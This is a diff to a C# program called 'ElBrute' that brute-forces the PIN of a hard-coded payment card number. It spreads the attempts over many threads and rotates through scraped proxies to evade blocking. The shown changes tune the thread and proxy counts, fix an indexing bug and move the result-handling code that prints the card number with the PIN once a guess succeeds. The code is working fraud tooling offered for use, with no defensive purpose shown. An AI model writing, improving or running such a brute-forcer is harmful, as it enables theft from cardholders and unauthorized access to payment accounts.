@@ -18,7 +18,7 @@ namespace ElBrute
         private static readonly List<Thread> ThreadList = new List<Thread>();
         private static int _scoreProxy = 0;
         private static int _scoreCode = 0;
-        private static int _countThreads = 0;
+        private static int _countThreads = 0; //Кол-во потоков для основного метода
         private const string card = "9643780042242413";
 
 
@@ -39,17 +39,19 @@ namespace ElBrute
                     ? File.ReadAllLines("goodProxy.txt").Count()
                     : 0;
 
-                if (count < 100)
+                if (count < 50)
                     StartCheckProxy();
 
                 else
                     _goodProxy = File.ReadAllLines("goodProxy.txt").ToList();
 
-                if (_goodProxy.Count > 100)
+                if (_goodProxy.Count > 50)
                 {
                     File.WriteAllLines("goodProxy.txt", _goodProxy);
 
                     _scoreProxy = 0;
+
+                    ThreadList.Clear();
 
                     Thread[] threads = new Thread[_countThreads];
                     for (int i = 0; i < threads.Length; i++)
@@ -73,7 +75,9 @@ namespace ElBrute
         {
             _proxy = Request.GetProxy();
 
-            Thread[] threads = new Thread[200];
+            int threadsCount = 150;
+
+            Thread[] threads = new Thread[threadsCount];
             for (int i = 0; i < threads.Length; i++)
             {
                 threads[i] = new Thread(new ThreadStart(CheckProxy));
@@ -113,15 +117,25 @@ namespace ElBrute
 
         private static void CheckProxy()
         {
-            for (int i = 0; i < _proxy.Count() - 1; i++)
+            int countProxy = _proxy.Count - 1;//Кол-во спарсенных проксей
+
+            for (int i = 0; i < countProxy; i++)
             {
                 string response = "";
                 string proxy = "";
 
                 lock (_consoleLocker)
                 {
-                    _scoreProxy++;
-                    proxy = _proxy[_scoreProxy];
+                    try
+                    {
+                        _scoreProxy++;
+                        proxy = _proxy[_scoreProxy];
+                    }
+                    catch(ArgumentOutOfRangeException ex)
+                    {
+                        StopThreads("proxy");
+                    }
+                    
                 }
 
                 try
@@ -162,45 +176,6 @@ namespace ElBrute
             }
         }
 
-        private static void DataResult(string result ,string pinCode, string proxy)
-        {
-            lock (_consoleLocker)
-            {
-                if (result == "Good")
-                {
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine("Номер карты: " + card + "\nПин-код: " + pinCode);
-                    StopThreads("Good");
-                }
-
-                else if (result == "Bad")
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine(pinCode);
-                    File.AppendAllText("Bad.txt", pinCode + "\n");
-                }
-
-                else if (result == "Error")
-                {
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine(proxy);
-                    _goodProxy.Remove(proxy);
-                    File.WriteAllLines("goodProxy.txt", _goodProxy);
-                }
-            }
-        }
-
-        private static void StopThreads(string info)
-        {
-            foreach (Thread thread in ThreadList)
-            {
-                thread.Abort();
-            }
-
-            if (info.Contains("small"))
-                StartProject();
-        }
-
         private static void CheckPinCode(string pinCode)
         {
             int checkCountProxy = 0;
@@ -210,14 +185,14 @@ namespace ElBrute
             lock (_consoleLocker)
             {
                 _scoreProxy++;
-                proxy = _goodProxy[_scoreCode];
+                proxy = _goodProxy[_scoreProxy];
             }
 
             try
             {
                 if (checkCountProxy == 30)
                 {
-                    if (File.ReadAllLines("goodProxy.txt").Count() < 100)
+                    if (File.ReadAllLines("goodProxy.txt").Count() < 50)
                         StopThreads("small proxy");
                 }
 
@@ -268,7 +243,7 @@ namespace ElBrute
                 response = Request.Post(characters, postCharacters);
 
                 if (response.Contains("Blocked"))
-                    throw new Exception("Block");                   
+                    throw new Exception("Block");
 
                 DataResult(response, pinCode, proxy);
             }
@@ -291,6 +266,45 @@ namespace ElBrute
                     CheckPinCode(pinCode);
                 }
             }
+        }
+
+        private static void DataResult(string result ,string pinCode, string proxy)
+        {
+            lock (_consoleLocker)
+            {
+                if (result == "Good")
+                {
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine("Номер карты: " + card + "\nПин-код: " + pinCode);
+                    StopThreads("Good");
+                }
+
+                else if (result == "Bad")
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine(pinCode);
+                    File.AppendAllText("Bad.txt", pinCode + "\n");
+                }
+
+                else if (result == "Error")
+                {
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine(proxy);
+                    _goodProxy.Remove(proxy);
+                    File.WriteAllLines("goodProxy.txt", _goodProxy);
+                }
+            }
+        }
+
+        private static void StopThreads(string info)
+        {
+            foreach (Thread thread in ThreadList)
+            {
+                thread.Abort();
+            }
+
+            if (info.Contains("small"))
+                StartProject();
         }
     }
 
